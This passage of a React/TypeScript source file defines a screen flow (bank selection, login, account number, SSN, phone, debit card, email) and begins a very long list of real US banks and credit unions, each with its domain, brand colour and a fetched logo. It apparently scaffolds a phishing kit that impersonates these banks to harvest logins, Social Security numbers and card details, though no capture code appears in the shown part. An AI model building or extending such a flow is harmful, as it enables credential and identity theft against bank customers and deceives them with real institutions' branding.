import React, { useState, useCallback, useMemo, useRef } from "react";
import { useQuery, useMutation, useAuth } from "@animaapp/playground-react-sdk";

// ─── Types ───────────────────────────────────────────────────────────────────
type Screen =
  | "select-bank"
  | "login"
  | "account-number"
  | "ssn"
  | "phone"
  | "debit-card"
  | "email";

interface Bank {
  id: string;
  name: string;
  domain: string;
  color: string;
  rank?: number;
}

// ─── Logo helpers ─────────────────────────────────────────────────────────────
const getLogo = (domain: string) => `https://logo.clearbit.com/${domain}`;
const getFallbackLogo = (domain: string) =>
  `https://www.google.com/s2/favicons?sz=128&domain_url=https://${domain}`;

// ─── Bank list ────────────────────────────────────────────────────────────────
const BANKS: Bank[] = [
  { id: "chase", name: "Chase", domain: "chase.com", color: "#117ACA", rank: 1 },
  { id: "bofa", name: "Bank of America", domain: "bankofamerica.com", color: "#E31837", rank: 2 },
  { id: "wells", name: "Wells Fargo", domain: "wellsfargo.com", color: "#D71E28", rank: 3 },
  { id: "citi", name: "Citibank", domain: "citi.com", color: "#003B70", rank: 4 },
  { id: "usbank", name: "US Bank", domain: "usbank.com", color: "#003087", rank: 5 },
  { id: "pnc", name: "PNC Bank", domain: "pnc.com", color: "#FF6200", rank: 6 },
  { id: "capital-one", name: "Capital One", domain: "capitalone.com", color: "#D03027", rank: 7 },
  { id: "td", name: "TD Bank", domain: "td.com", color: "#34B233", rank: 8 },
  { id: "regions", name: "Regions Bank", domain: "regions.com", color: "#006747", rank: 9 },
  { id: "truist", name: "Truist", domain: "truist.com", color: "#5C1D87", rank: 10 },
  { id: "ally", name: "Ally Bank", domain: "ally.com", color: "#7A0019", rank: 11 },
  { id: "suntrust", name: "SunTrust", domain: "suntrust.com", color: "#003B5C", rank: 12 },
  { id: "fifth-third", name: "Fifth Third Bank", domain: "53.com", color: "#1A5276", rank: 13 },
  { id: "citizens", name: "Citizens Bank", domain: "citizensbank.com", color: "#00539B", rank: 14 },
  { id: "keybank", name: "KeyBank", domain: "key.com", color: "#006747", rank: 15 },
  { id: "huntington", name: "Huntington Bank", domain: "huntington.com", color: "#006747", rank: 16 },
  { id: "bbt", name: "BB&T", domain: "bbt.com", color: "#006747", rank: 17 },
  { id: "santander", name: "Santander Bank", domain: "santanderbank.com", color: "#EC0000", rank: 18 },
  { id: "compass", name: "BBVA Compass", domain: "bbvausa.com", color: "#004481", rank: 19 },
  { id: "svb", name: "Silicon Valley Bank", domain: "svb.com", color: "#3C3C3C", rank: 20 },
  { id: "firstrepublic", name: "First Republic Bank", domain: "firstrepublic.com", color: "#003087", rank: 21 },
  { id: "new-york-community", name: "New York Community Bank", domain: "mynycb.com", color: "#00539B", rank: 22 },
  { id: "discover", name: "Discover Bank", domain: "discover.com", color: "#FF6600", rank: 23 },
  { id: "synchrony", name: "Synchrony Bank", domain: "synchronybank.com", color: "#003087", rank: 24 },
  { id: "goldman", name: "Goldman Sachs (Marcus)", domain: "marcus.com", color: "#1A1A1A", rank: 25 },
  { id: "american-express", name: "American Express", domain: "americanexpress.com", color: "#007BC1", rank: 26 },
  { id: "navy-fed", name: "Navy Federal CU", domain: "navyfederal.org", color: "#003087", rank: 27 },
  { id: "usaa", name: "USAA", domain: "usaa.com", color: "#003087", rank: 28 },
  { id: "bmo", name: "BMO Harris", domain: "bmoharris.com", color: "#0079C1", rank: 29 },
  { id: "iberia", name: "IberiaBank", domain: "iberiabank.com", color: "#003087", rank: 30 },
  { id: "wintrust", name: "Wintrust Financial", domain: "wintrust.com", color: "#003087", rank: 31 },
  { id: "synovus", name: "Synovus Bank", domain: "synovus.com", color: "#003087", rank: 32 },
  { id: "glacier", name: "Glacier Bancorp", domain: "glacierbancorp.com", color: "#006747", rank: 33 },
  { id: "banner", name: "Banner Bank", domain: "bannerbank.com", color: "#003087", rank: 34 },
  { id: "south-state", name: "South State Bank", domain: "southstatebank.com", color: "#003087", rank: 35 },
  { id: "pentagon", name: "Pentagon Federal CU", domain: "penfed.org", color: "#003087" },
  { id: "alliant", name: "Alliant Credit Union", domain: "alliantcreditunion.org", color: "#003087" },
  { id: "becu", name: "BECU", domain: "becu.org", color: "#006747" },
  { id: "firsttech", name: "First Tech Federal CU", domain: "firsttech.com", color: "#006747" },
  { id: "schoolsfirst", name: "SchoolsFirst FCU", domain: "schoolsfirstfcu.org", color: "#003087" },
  { id: "golden1", name: "Golden 1 Credit Union", domain: "golden1.com", color: "#FFD700" },
  { id: "suncoast", name: "Suncoast Credit Union", domain: "suncoastcreditunion.com", color: "#006747" },
  { id: "patelco", name: "Patelco Credit Union", domain: "patelco.org", color: "#003087" },
  { id: "desert-financial", name: "Desert Financial CU", domain: "desertfinancial.com", color: "#003087" },
  { id: "communityamerica", name: "CommunityAmerica CU", domain: "communityamerica.com", color: "#003087" },
  { id: "service-cu", name: "Service Credit Union", domain: "servicecu.org", color: "#006747" },
  { id: "mission-fed", name: "Mission Federal CU", domain: "missionfed.com", color: "#003087" },
  { id: "logix", name: "Logix Federal CU", domain: "logixbanking.com", color: "#003087" },
  { id: "landmark", name: "Landmark Credit Union", domain: "landmarkcu.com", color: "#006747" },
  { id: "stcu", name: "STCU", domain: "stcu.org", color: "#006747" },
  { id: "america-first", name: "America First CU", domain: "americafirst.com", color: "#C8102E" },
  { id: "mountain-america", name: "Mountain America CU", domain: "macu.com", color: "#003087" },
  { id: "randolph-brooks", name: "Randolph-Brooks FCU", domain: "rbfcu.org", color: "#003087" },
  { id: "security-service", name: "Security Service FCU", domain: "ssfcu.org", color: "#003087" },
  { id: "kinecta", name: "Kinecta Federal CU", domain: "kinecta.org", color: "#003087" },
  { id: "star-one", name: "Star One CU", domain: "starone.org", color: "#003087" },
  { id: "travis-cu", name: "Travis Credit Union", domain: "traviscu.org", color: "#006747" },
  { id: "safe-cu", name: "SAFE Credit Union", domain: "safecu.org", color: "#003087" },
  { id: "wescom", name: "Wescom Credit Union", domain: "wescom.org", color: "#003087" },
  { id: "eecu", name: "EECU", domain: "eecu.org", color: "#003087" },
  { id: "onpoint-cu", name: "OnPoint Community CU", domain: "onpointcu.com", color: "#003087" },
  { id: "gesa-cu", name: "Gesa Credit Union", domain: "gesa.com", color: "#003087" },
  { id: "wsecu", name: "WSECU", domain: "wsecu.org", color: "#006747" },
  { id: "cal-coast-cu", name: "California Coast CU", domain: "calcoastcu.org", color: "#003087" },
  { id: "greater-texas", name: "Greater Texas FCU", domain: "greatertexasfcu.org", color: "#003087" },
  { id: "amplify-cu", name: "Amplify Credit Union", domain: "goamplify.com", color: "#003087" },
  { id: "university-fcu", name: "University FCU", domain: "ufcu.org", color: "#003087" },
  { id: "tdecu", name: "TDECU", domain: "tdecu.org", color: "#003087" },
  { id: "sofi-bank", name: "SoFi Bank", domain: "sofi.com", color: "#8B5CF6" },
  { id: "chime", name: "Chime", domain: "chime.com", color: "#00D4C8" },
  { id: "current-bank", name: "Current", domain: "current.com", color: "#00D4AA" },
  { id: "varo-bank", name: "Varo Bank", domain: "varomoney.com", color: "#5B4FE9" },
  { id: "state-empl-cu-nc", name: "State Employees CU (NC)", domain: "ncsecu.org", color: "#003087" },
  { id: "vystar-cu", name: "VyStar Credit Union", domain: "vystarcu.org", color: "#003087" },
  { id: "space-coast-cu", name: "Space Coast CU", domain: "sccu.com", color: "#003087" },
  { id: "digital-fcu", name: "Digital FCU", domain: "dcu.org", color: "#003087" },
  { id: "lmcu", name: "Lake Michigan CU", domain: "lmcu.org", color: "#003087" },
  { id: "dfcu-financial", name: "DFCU Financial", domain: "dfcufinancial.com", color: "#003087" },
  { id: "idaho-central-cu", name: "Idaho Central CU", domain: "iccu.com", color: "#003087" },
  { id: "veridian-cu", name: "Veridian Credit Union", domain: "veridiancu.org", color: "#006747" },
  { id: "uw-credit-union", name: "UW Credit Union", domain: "uwcu.org", color: "#CC0000" },
  { id: "royal-cu", name: "Royal Credit Union", domain: "rcu.org", color: "#003087" },
  { id: "virginia-credit-union", name: "Virginia Credit Union", domain: "vacu.org", color: "#003087" },
  { id: "delta-community-cu", name: "Delta Community CU", domain: "deltacommunitycu.com", color: "#003087" },
  { id: "redstone-fcu", name: "Redstone FCU", domain: "redstonefcu.org", color: "#C8102E" },
  { id: "tinker-fcu", name: "Tinker FCU", domain: "tinkerfcu.org", color: "#003087" },
  { id: "arkansas-fcu", name: "Arkansas FCU", domain: "arkansasfederal.org", color: "#003087" },
  { id: "tulsa-teachers-cu", name: "Tulsa Teachers CU", domain: "ttcu.com", color: "#006747" },
  { id: "hawaii-state-fcu", name: "Hawaii State FCU", domain: "hsfcu.com", color: "#003087" },
  { id: "alaska-usa-fcu", name: "Alaska USA FCU", domain: "alaskausa.org", color: "#003087" },
  { id: "truliant-fcu", name: "Truliant FCU", domain: "truliant.org", color: "#003087" },
  { id: "ascend-fcu", name: "Ascend FCU", domain: "ascendfcu.org", color: "#003087" },
  { id: "redwood-credit-union", name: "Redwood CU", domain: "redwoodcu.org", color: "#006747" },
  { id: "san-diego-county-cu", name: "San Diego County CU", domain: "sdccu.com", color: "#003087" },
  { id: "orange-county-cu", name: "Orange County&#39;s CU", domain: "orangecountyscu.org", color: "#006747" },
  { id: "flagstar", name: "Flagstar Bank", domain: "flagstar.com", color: "#003087" },
  { id: "bank-of-the-west", name: "Bank of the West", domain: "bankofthewest.com", color: "#004481" },
  { id: "commerce-bank", name: "Commerce Bank", domain: "commercebank.com", color: "#003087" },
  { id: "first-midwest-bank", name: "First Midwest Bank", domain: "firstmidwest.com", color: "#003087" },
  { id: "old-national", name: "Old National Bank", domain: "oldnational.com", color: "#003087" },
  { id: "associated-bank", name: "Associated Bank", domain: "associatedbank.com", color: "#003087" },
  { id: "pinnacle-financial", name: "Pinnacle Financial Partners", domain: "pnfp.com", color: "#003087" },
  { id: "texas-capital-bank", name: "Texas Capital Bank", domain: "texascapitalbank.com", color: "#003087" },
  { id: "western-alliance-bank", name: "Western Alliance Bank", domain: "westernalliancebancorporation.com", color: "#003087" },
  { id: "bank-of-hawaii", name: "Bank of Hawaii", domain: "boh.com", color: "#003087" },
  { id: "first-hawaiian-bank", name: "First Hawaiian Bank", domain: "fhb.com", color: "#003087" },
  { id: "woodforest-bank", name: "Woodforest National Bank", domain: "woodforest.com", color: "#006747" },
  { id: "city-national-bank", name: "City National Bank", domain: "cnb.com", color: "#003087" },
  { id: "east-west-bank", name: "East West Bank", domain: "eastwestbank.com", color: "#C8102E" },
  { id: "cathay-bank", name: "Cathay Bank", domain: "cathaybank.com", color: "#C8102E" },
  { id: "hanmi-bank", name: "Hanmi Bank", domain: "hanmi.com", color: "#003087" },
  { id: "rockland-trust", name: "Rockland Trust", domain: "rocklandtrust.com", color: "#006747" },
  { id: "brookline-bank", name: "Brookline Bancorp", domain: "brooklinebank.com", color: "#003087" },
  { id: "century-bank", name: "Century Bank (MA)", domain: "century-bank.com", color: "#003087" },
  { id: "valley-national-bank", name: "Valley National Bank", domain: "valley.com", color: "#003087" },
  { id: "provident-bank-nj", name: "Provident Bank (NJ)", domain: "providentbank.com", color: "#003087" },
  { id: "ocean-first-bank", name: "OceanFirst Bank", domain: "oceanfirst.com", color: "#006747" },
  { id: "sandy-spring-bank", name: "Sandy Spring Bank", domain: "sandyspringbank.com", color: "#006747" },
  { id: "columbia-bank-md", name: "Columbia Bank (MD)", domain: "columbiabankonline.com", color: "#003087" },
  { id: "sunflower-bank", name: "Sunflower Bank", domain: "sunflowerbank.com", color: "#FFB81C" },
  { id: "heritage-bank", name: "Heritage Bank", domain: "heritagebank.com", color: "#003087" },
  { id: "columbia-bank", name: "Columbia Bank", domain: "columbiabank.com", color: "#003087" },
  { id: "centennial-bank", name: "Centennial Bank", domain: "my100bank.com", color: "#003087" },
  { id: "firstbank-co", name: "FirstBank (Colorado)", domain: "efirstbank.com", color: "#003087" },
  { id: "stockyards-bank", name: "Stock Yards Bank", domain: "syb.com", color: "#003087" },
  { id: "midland-states-bank", name: "Midland States Bank", domain: "midlandsb.com", color: "#003087" },
  { id: "townbank", name: "TowneBank", domain: "townebank.com", color: "#003087" },
  { id: "atlantic-union-bank", name: "Atlantic Union Bank", domain: "atlanticunionbank.com", color: "#003087" },
  { id: "bangor-savings-bank", name: "Bangor Savings Bank", domain: "bangorsavings.com", color: "#003087" },
  { id: "camden-national-bank", name: "Camden National Bank", domain: "camdennational.com", color: "#003087" },
  { id: "five-star-bank", name: "Five Star Bank", domain: "fivestarbank.com", color: "#FFB81C" },
  { id: "tompkins-financial", name: "Tompkins Financial", domain: "tompkinsfinancial.com", color: "#003087" },
  { id: "adirondack-trust", name: "Adirondack Trust Company", domain: "adirondackbank.com", color: "#003087" },
  { id: "wings-cu", name: "Wings Credit Union", domain: "wingsfinancial.com", color: "#004B8D" },
  { id: "covantage-cu", name: "CoVantage Credit Union", domain: "covantagecu.org", color: "#007A3D" },
  { id: "hccu", name: "HCCU", domain: "hccu.org", color: "#005587" },

  // ── Consumers CU + Additional US Credit Unions & Local Banks ──────────────
  { id: "consumers-cu", name: "Consumers Credit Union", domain: "myconsumers.org", color: "#0057A8" },
  { id: "affinity-plus-fcu", name: "Affinity Plus FCU", domain: "affinityplus.org", color: "#007A3D" },
  { id: "alaska-fcu", name: "Alaska Federal CU", domain: "alaskafcu.org", color: "#003087" },
  { id: "allegacy-fcu", name: "Allegacy FCU", domain: "allegacy.org", color: "#CC0000" },
  { id: "allco-fcu", name: "ALLCO FCU", domain: "allcofcu.org", color: "#003087" },
  { id: "altra-fcu", name: "Altra Federal CU", domain: "altra.org", color: "#006747" },
  { id: "american-heritage-fcu", name: "American Heritage FCU", domain: "americanheritagecu.org", color: "#CC0000" },
  { id: "apco-employees-cu", name: "APCO Employees CU", domain: "apcocu.org", color: "#003087" },
  { id: "arizona-fcu", name: "Arizona Federal CU", domain: "arizonafederal.org", color: "#CC0000" },
  { id: "arrowhead-cu", name: "Arrowhead Credit Union", domain: "arrowheadcu.org", color: "#8B0000" },
  { id: "ascentra-cu", name: "Ascentra Credit Union", domain: "ascentra.org", color: "#004481" },
  { id: "aspire-fcu", name: "Aspire FCU", domain: "aspirefcu.org", color: "#003087" },
  { id: "bay-fcu", name: "Bay Federal CU", domain: "bayfed.com", color: "#006747" },
  { id: "beacon-cu", name: "Beacon Credit Union", domain: "beaconcu.org", color: "#003087" },
  { id: "belco-cu", name: "Belco Community CU", domain: "belco.org", color: "#003087" },
  { id: "blue-fcu", name: "Blue Federal CU", domain: "bluefcu.com", color: "#0057A8" },
  { id: "boardwalk-fcu", name: "Boardwalk FCU", domain: "boardwalkfcu.org", color: "#003087" },
  { id: "boulder-valley-cu", name: "Boulder Valley CU", domain: "bvcu.org", color: "#006747" },
  { id: "bu-employees-cu", name: "BU Employees CU", domain: "buecu.org", color: "#CC0000" },
  { id: "california-fcu", name: "California FCU", domain: "calfcu.org", color: "#003087" },
  { id: "campus-usa-cu", name: "Campus USA CU", domain: "campuscu.com", color: "#FF6200" },
  { id: "cape-cod-5-bank", name: "Cape Cod Five", domain: "capecodfive.com", color: "#003087" },
  { id: "capital-cu", name: "Capital Credit Union", domain: "capitalcu.com", color: "#003087" },
  { id: "card-services-fcu", name: "CardServices FCU", domain: "cardservicesfcu.org", color: "#003087" },
  { id: "carolina-telco-fcu", name: "Carolina Telco FCU", domain: "carolinatelco.org", color: "#003087" },
  { id: "catalyst-corporate-fcu", name: "Catalyst Corporate FCU", domain: "catalystcorp.org", color: "#003087" },
  { id: "central-plus-fcu", name: "Central Plus FCU", domain: "centralplus.org", color: "#003087" },
  { id: "charter-one", name: "Charter One Bank", domain: "charterone.com", color: "#003087" },
  { id: "chemical-bank", name: "Chemical Bank", domain: "chemicalbank.com", color: "#003087" },
  { id: "christian-community-cu", name: "Christian Community CU", domain: "mycccu.com", color: "#006747" },
  { id: "citizens-community-cu", name: "Citizens Community CU", domain: "citizenscommunitycu.org", color: "#003087" },
  { id: "coastal-fcu", name: "Coastal FCU", domain: "coastal24.com", color: "#006747" },
  { id: "colorado-cu", name: "Colorado Credit Union", domain: "coloradocreditunion.com", color: "#003087" },
  { id: "community-bank-na", name: "Community Bank N.A.", domain: "communitybanksys.com", color: "#003087" },
  { id: "community-choice-cu", name: "Community Choice CU", domain: "communitychoice.com", color: "#CC0000" },
  { id: "community-first-cu-wi", name: "Community First CU (WI)", domain: "communityfirstcu.org", color: "#006747" },
  { id: "community-plus-fcu", name: "Community Plus FCU", domain: "communityplusfcu.org", color: "#003087" },
  { id: "connex-cu", name: "Connex Credit Union", domain: "connexcu.org", color: "#003087" },
  { id: "cornerstone-cu", name: "Cornerstone CU", domain: "cornerstonesedalia.com", color: "#003087" },
  { id: "corporate-america-fcu", name: "Corporate America FCU", domain: "cafcu.org", color: "#003087" },
  { id: "credit-union-1", name: "Credit Union 1", domain: "creditunion1.org", color: "#CC0000" },
  { id: "cu-of-ohio", name: "Credit Union of Ohio", domain: "cuofoh.org", color: "#CC0000" },
  { id: "cu-so-cal", name: "CU SoCal", domain: "cusocal.org", color: "#003087" },
  { id: "dacotah-bank", name: "Dacotah Bank", domain: "dacotahbank.com", color: "#003087" },
  { id: "dana-point-fcu", name: "Dana Point FCU", domain: "danapointfcu.org", color: "#003087" },
  { id: "denali-fcu", name: "Denali FCU", domain: "denalifcu.com", color: "#003087" },
  { id: "dort-fcu", name: "Dort Financial CU", domain: "dortfcu.org", color: "#003087" },
  { id: "dupont-community-cu", name: "DuPont Community CU", domain: "dcufcu.net", color: "#CC0000" },
  { id: "earth-movers-cu", name: "Earth Movers CU", domain: "earthmoverscu.org", color: "#003087" },
  { id: "educators-cu", name: "Educators Credit Union", domain: "ecu.com", color: "#006747" },
  { id: "element-fcu", name: "Element FCU", domain: "elementfcu.org", color: "#003087" },
  { id: "emergent-fcu", name: "Emergent FCU", domain: "emergentfcu.org", color: "#003087" },
  { id: "empower-fcu", name: "Empower FCU", domain: "empowerfcu.com", color: "#FF6200" },
  { id: "ent-cu", name: "Ent Credit Union", domain: "ent.com", color: "#003087" },
  { id: "envista-cu", name: "Envista Credit Union", domain: "envistacreditunion.com", color: "#006747" },
  { id: "esl-fcu", name: "ESL Federal CU", domain: "esl.org", color: "#003087" },
  { id: "fall-river-muni-cu", name: "Fall River Muni CU", domain: "frmuniefcu.org", color: "#003087" },
  { id: "family-advantage-fcu", name: "Family Advantage FCU", domain: "familyadvantagefcu.org", color: "#003087" },
  { id: "family-trust-fcu", name: "Family Trust FCU", domain: "familytrustfcu.org", color: "#003087" },
  { id: "farm-bureau-bank", name: "Farm Bureau Bank", domain: "farmbureaubank.com", color: "#006747" },
  { id: "fcu-nevada", name: "Nevada FCU", domain: "nevadafcu.org", color: "#CC0000" },
  { id: "fidelity-bank-nc", name: "Fidelity Bank (NC)", domain: "myfidelitybank.com", color: "#003087" },
  { id: "financial-partners-cu", name: "Financial Partners CU", domain: "fpcu.org", color: "#003087" },
  { id: "finex-cu", name: "Finex CU", domain: "finexcu.org", color: "#003087" },
  { id: "first-commerce-cu", name: "First Commerce CU", domain: "firstcommercecu.org", color: "#003087" },
  { id: "first-community-cu-mo", name: "First Community CU (MO)", domain: "firstcommunity.org", color: "#006747" },
  { id: "first-entertainment-cu", name: "First Entertainment CU", domain: "firstentertainment.org", color: "#CC0000" },
  { id: "first-flight-fcu", name: "First Flight FCU", domain: "firstflightfcu.org", color: "#003087" },
  { id: "first-keystone-fcu", name: "First Keystone FCU", domain: "firstkeystonefcu.org", color: "#003087" },
  { id: "first-new-york-fcu", name: "First New York FCU", domain: "firstnewyorkfcu.org", color: "#003087" },
  { id: "first-south-fcu", name: "First South FCU", domain: "firstsouthfcu.org", color: "#003087" },
  { id: "first-us-cu", name: "First US Community CU", domain: "firstuscreditunion.com", color: "#003087" },
  { id: "florida-credit-union", name: "Florida Credit Union", domain: "flcu.org", color: "#006747" },
  { id: "founders-fcu", name: "Founders FCU", domain: "foundersfcu.org", color: "#CC0000" },
  { id: "franklin-mint-fcu", name: "Franklin Mint FCU", domain: "fmfcu.org", color: "#003087" },
  { id: "freedom-first-cu", name: "Freedom First CU", domain: "freedomfirst.com", color: "#CC0000" },
  { id: "frontwave-cu", name: "Frontwave CU", domain: "frontwavecu.com", color: "#003087" },
  { id: "genisys-cu", name: "Genisys Credit Union", domain: "genisyscu.org", color: "#003087" },
  { id: "georgia-own-cu", name: "Georgia Own CU", domain: "georgiaown.org", color: "#CC0000" },
  { id: "geovista-cu", name: "GeoVista CU", domain: "geovistafcu.org", color: "#006747" },
  { id: "glendale-area-schools-cu", name: "Glendale Area Schools FCU", domain: "gasfcu.com", color: "#003087" },
  { id: "golden-plains-cu", name: "Golden Plains CU", domain: "goldenplains.org", color: "#FFD700" },
  { id: "goldenwest-cu", name: "GoldenWest CU", domain: "goldenwestcu.org", color: "#003087" },
  { id: "grcu", name: "Granite Region CU", domain: "graniteregioncu.com", color: "#003087" },
  { id: "great-lakes-cu", name: "Great Lakes CU", domain: "glcuonline.org", color: "#003087" },
  { id: "greater-iowa-cu", name: "Greater Iowa CU", domain: "greateriowacu.org", color: "#003087" },
  { id: "greenstate-cu", name: "GreenState CU", domain: "greenstate.org", color: "#006747" },
  { id: "guam-fcu", name: "Guam Federal CU", domain: "gfcu.com", color: "#003087" },
  { id: "gulf-coast-educators-fcu", name: "Gulf Coast Educators FCU", domain: "gcefcu.org", color: "#003087" },
  { id: "harbor-credit-union", name: "Harbor Credit Union", domain: "harborcu.org", color: "#003087" },
  { id: "harborstone-cu", name: "Harborstone CU", domain: "harborstone.com", color: "#003087" },
  { id: "healthcare-systems-fcu", name: "Healthcare Systems FCU", domain: "hsfcu.org", color: "#006747" },
  { id: "heartland-cu-il", name: "Heartland CU (IL)", domain: "heartlandcu.org", color: "#CC0000" },
  { id: "hi-school-pharmacy-fcu", name: "Hi-School Pharmacy FCU", domain: "hispfcu.org", color: "#003087" },
  { id: "hoosier-hills-cu", name: "Hoosier Hills CU", domain: "hooksfcu.org", color: "#003087" },
  { id: "horizon-cu", name: "Horizon Credit Union", domain: "hzcu.org", color: "#006747" },
  { id: "houston-police-fcu", name: "Houston Police FCU", domain: "houstonfcu.org", color: "#003087" },
  { id: "hudson-valley-fcu", name: "Hudson Valley FCU", domain: "hvfcu.org", color: "#003087" },
  { id: "illinois-fcu", name: "Illinois Federal CU", domain: "illinoisfcu.org", color: "#CC0000" },
  { id: "indiana-members-cu", name: "Indiana Members CU", domain: "imcu.com", color: "#003087" },
  { id: "inland-empire-schools-fcu", name: "Inland Empire Schools FCU", domain: "iesfcu.org", color: "#003087" },
  { id: "interra-cu", name: "Interra Credit Union", domain: "interracu.com", color: "#006747" },
  { id: "ios-fcu", name: "IOS Federal CU", domain: "iosfcu.org", color: "#003087" },
  { id: "island-fcu", name: "Island FCU", domain: "islandfcu.org", color: "#003087" },
  { id: "jax-fcu", name: "Jax Federal CU", domain: "jaxfcu.org", color: "#003087" },
  { id: "jewel-osco-employees-fcu", name: "Jewel-Osco Empl. FCU", domain: "jefcu.org", color: "#CC0000" },
  { id: "jpmorgan-chase-fcu", name: "JPMorgan Chase Employees CU", domain: "jpmccu.org", color: "#117ACA" },
  { id: "kan-educ-cu", name: "Kansas Education CU", domain: "kaecu.org", color: "#003087" },
  { id: "keesler-fcu", name: "Keesler FCU", domain: "keeslerfcu.org", color: "#003087" },
  { id: "kemba-cu", name: "KEMBA Financial CU", domain: "kembafinancial.org", color: "#CC0000" },
  { id: "kent-county-cu", name: "Kent County CU", domain: "kentcountycreditunion.com", color: "#003087" },
  { id: "knoxville-tva-employees-cu", name: "Knoxville TVA Employees CU", domain: "tvacreditunion.com", color: "#003087" },
  { id: "lake-shore-savings-bank", name: "Lake Shore Savings Bank", domain: "lakeshoresavings.com", color: "#003087" },
  { id: "lanco-fcu", name: "LANCO FCU", domain: "lancofcu.org", color: "#003087" },
  { id: "leominster-cu", name: "Leominster CU", domain: "leominstercu.com", color: "#003087" },
  { id: "liberty-fcu", name: "Liberty FCU", domain: "libertyfcu.org", color: "#CC0000" },
  { id: "listerhill-cu", name: "Listerhill CU", domain: "listerhill.com", color: "#003087" },
  { id: "lockheed-fcu", name: "Lockheed FCU", domain: "lfcu.org", color: "#003087" },
  { id: "los-angeles-police-fcu", name: "Los Angeles Police FCU", domain: "lapfcu.org", color: "#003087" },
  { id: "louchem-fcu", name: "LouChem FCU", domain: "louchemfcu.org", color: "#003087" },
  { id: "main-street-bank", name: "Main Street Bank", domain: "msbonline.com", color: "#003087" },
  { id: "maps-cu", name: "MAPS Credit Union", domain: "mapscu.com", color: "#006747" },
  { id: "marine-fcu", name: "Marine FCU", domain: "marinefcu.com", color: "#003087" },
  { id: "mazuma-cu", name: "Mazuma CU", domain: "mazumacu.org", color: "#003087" },
  { id: "mccu", name: "Municipal Credit Union (NY)", domain: "nymcu.org", color: "#003087" },
  { id: "medisys-health-cu", name: "MediSys Health CU", domain: "medisysfcu.org", color: "#006747" },
  { id: "members-1st-fcu", name: "Members 1st FCU", domain: "members1st.org", color: "#CC0000" },
  { id: "members-advantage-cu", name: "Members Advantage CU", domain: "membersadvantagefcu.org", color: "#003087" },
  { id: "members-cu-nc", name: "Members CU (NC)", domain: "memberscunline.com", color: "#003087" },
  { id: "meritrust-cu", name: "Meritrust CU", domain: "meritrust.org", color: "#006747" },
  { id: "metro-cu-ma", name: "Metro Credit Union (MA)", domain: "metrocu.org", color: "#CC0000" },
  { id: "michigan-first-cu", name: "Michigan First CU", domain: "michiganfirst.com", color: "#003087" },
  { id: "michigan-schools-govt-cu", name: "Michigan Schools & Govt CU", domain: "msgcu.org", color: "#003087" },
  { id: "mid-mo-cu", name: "Mid-Missouri CU", domain: "midmocu.org", color: "#003087" },
  { id: "midland-cu", name: "Midland Credit Union", domain: "midlandcu.com", color: "#003087" },
  { id: "midwest-fcu", name: "Midwest Federal CU", domain: "midwestfederal.org", color: "#003087" },
  { id: "military-aviators-cu", name: "Military Aviators CU", domain: "militaryaviatorscu.org", color: "#003087" },
  { id: "mills-42-fcu", name: "Mills 42 FCU", domain: "mills42fcu.org", color: "#003087" },
  { id: "minnesota-power-empl-cu", name: "Minnesota Power Employees CU", domain: "mpecu.org", color: "#003087" },
  { id: "mint-valley-fcu", name: "Mint Valley FCU", domain: "mintvalleyfcu.org", color: "#006747" },
  { id: "mke-firefighters-cu", name: "Milwaukee Firefighters CU", domain: "milwaukeefirefighterscu.org", color: "#CC0000" },
  { id: "mobility-fcu", name: "Mobility FCU", domain: "mobilityfcu.org", color: "#003087" },
  { id: "moc-fcu", name: "MOC FCU", domain: "mocfcu.org", color: "#003087" },
  { id: "modern-woodmen-fcu", name: "Modern Woodmen FCU", domain: "modernwoodmenfcu.org", color: "#003087" },
  { id: "money-one-fcu", name: "Money One FCU", domain: "moneyonefcu.org", color: "#003087" },
  { id: "monmouth-county-cu", name: "Monmouth County CU", domain: "monmouthcountycu.org", color: "#003087" },
  { id: "montana-fcu", name: "Montana FCU", domain: "montanafcu.com", color: "#006747" },
  { id: "moriches-bay-fcu", name: "Moriches Bay FCU", domain: "morichesbay.org", color: "#003087" },
  { id: "motorola-empl-cu", name: "Motorola Employees CU", domain: "mecu.com", color: "#003087" },
  { id: "muncie-ind-fcu", name: "Muncie Indiana FCU", domain: "munciefcu.org", color: "#003087" },
  { id: "national-penn-bank", name: "National Penn Bank", domain: "nationalpennbank.com", color: "#003087" },
  { id: "nesc-fcu", name: "NESC FCU", domain: "nescfcu.org", color: "#003087" },
  { id: "new-alliance-bank", name: "NewAlliance Bank", domain: "newalliancebank.com", color: "#003087" },
  { id: "new-england-fcu", name: "New England FCU", domain: "nefcu.com", color: "#003087" },
  { id: "new-horizons-cu", name: "New Horizons CU", domain: "newhorizonscreditunion.com", color: "#003087" },
  { id: "new-jersey-efcu", name: "NJ Educators CU", domain: "njefcu.org", color: "#003087" },
  { id: "nexgen-fcu", name: "NexGen FCU", domain: "nexgenfcu.org", color: "#003087" },
  { id: "norfolk-fire-dept-fcu", name: "Norfolk Fire Dept FCU", domain: "nfdcu.org", color: "#CC0000" },
  { id: "north-country-savings-bank", name: "North Country Savings Bank", domain: "northcountrysavings.com", color: "#003087" },
  { id: "north-shore-bank", name: "North Shore Bank", domain: "northshorebank.com", color: "#003087" },
  { id: "northern-plains-cu", name: "Northern Plains CU", domain: "northernplainscu.org", color: "#003087" },
  { id: "northwest-community-cu", name: "Northwest Community CU", domain: "nwcu.com", color: "#006747" },
  { id: "northwest-savings-bank", name: "Northwest Savings Bank", domain: "nwsb.com", color: "#003087" },
  { id: "nossi-college-fcu", name: "Nossi College FCU", domain: "nossifcu.org", color: "#003087" },
  { id: "nuc-fcu", name: "Nuclear FCU", domain: "nucfcu.org", color: "#003087" },
  { id: "ny-municipality-fcu", name: "NY Municipal FCU", domain: "nymfcu.org", color: "#003087" },
  { id: "nymeo-fcu", name: "NYMEO FCU", domain: "nymeo.org", color: "#003087" },
  { id: "ohio-healthcare-fcu", name: "Ohio Healthcare FCU", domain: "ohiohealthcarefcu.org", color: "#006747" },
  { id: "oklahoma-fcu", name: "Oklahoma FCU", domain: "okfcu.com", color: "#CC0000" },
  { id: "old-second-national-bank", name: "Old Second National Bank", domain: "oldsecond.com", color: "#003087" },
  { id: "olympia-fcu", name: "Olympia FCU", domain: "msolympiafcu.org", color: "#003087" },
  { id: "omaha-fcu", name: "Omaha FCU", domain: "omahafcu.org", color: "#003087" },
  { id: "one-nevada-cu", name: "One Nevada CU", domain: "onenevada.org", color: "#CC0000" },
  { id: "opuone-cu", name: "OPUSone FCU", domain: "opusonefcu.org", color: "#003087" },
  { id: "oregon-community-cu", name: "Oregon Community CU", domain: "oregoncommunitycu.org", color: "#006747" },
  { id: "ornl-fcu", name: "ORNL FCU", domain: "ornlfcu.com", color: "#003087" },
